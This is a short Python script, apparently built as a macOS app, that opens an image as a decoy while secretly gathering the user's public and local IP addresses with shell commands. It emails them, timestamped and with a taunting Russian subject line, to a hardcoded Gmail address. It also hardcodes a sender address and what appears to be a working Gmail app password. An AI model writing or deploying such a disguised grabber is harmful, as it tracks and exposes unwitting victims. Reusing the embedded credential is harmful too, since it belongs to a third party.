from os import popen, getcwd
from PIL import Image
from email_to import EmailServer, Message
'''
 this implementation option doesn't work for me in application file, cause unknown.
 wrote about the problem on stackoverflow :
 https://ru.stackoverflow.com/questions/1435519/modulenotfounderror-%d0%bf%d0%be%d1%81%d0%bb%d0%b5-%d0%b7%d0%b0%d0%bf%d1%83%d1%81%d0%ba%d0%b0-%d1%81%d0%be%d0%b7%d0%b4%d0%b0%d0%bd%d0%bd%d0%be%d0%b3%d0%be-app-%d1%84%d0%b0%d0%b9%d0%bb%d0%b0-%d1%81%d0%be%d0%b7%d0%b4%d0%b0%d0%bd%d0%bd%d0%be%d0%b3%d0%be-%d1%81-%d0%bf%d0%be%d0%bc%d0%be%d1%89%d1%8c%d1%8e-py2
 https://stackoverflow.com/questions/73201835/py2app-email-to-gmail-modulenotfounderror-no-module-named-email-to
 but the python file itself works out from my computer!
'''
def shape():
  try: myhtml = f"""<!DOCTYPE html><html><body><br><input type="text" value="Local : {popen("curl ifconfig.me").read().strip()}" size = "25" style="text-align:center" readonly><br><br><input type="text" value="Global : {popen("ipconfig getifaddr en0").read().strip()}" size = "25" style="text-align:center" readonly></body></html>"""
  except: myhtml = "ERROR :("
  finally:
    sender = "7kipgod@gmail.com"
    destination = "svaller22@gmail.com" # !!! enter where to send the message
    
    # create a password for the app bot and get the password by putting it in brackets : https://myaccount.google.com/apppasswords
    EmailServer('smtp.gmail.com', 587, sender, "eifjuipuczaxguxb").send_message(Message(myhtml), destination, f"Попался, который кусался! {popen('date').read()}")

if __name__ == "__main__": 
  Image.open(f"{getcwd()}/image.jpeg").show()
  shape()